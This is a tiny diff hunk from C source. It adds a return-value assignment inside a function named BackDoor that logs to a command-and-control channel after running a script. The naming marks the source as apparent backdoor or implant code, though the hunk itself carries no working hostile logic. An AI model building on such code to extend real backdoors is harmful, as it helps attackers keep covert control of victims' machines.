@@ -334,6 +334,7 @@ DWORD BackDoor() {
     c2_log("[+] Script ran successfully\n");
     CloseHandle(procInfo.hProcess);
     CloseHandle(procInfo.hThread);
+    ret = 0;
 
 end:
     if (script_path) {
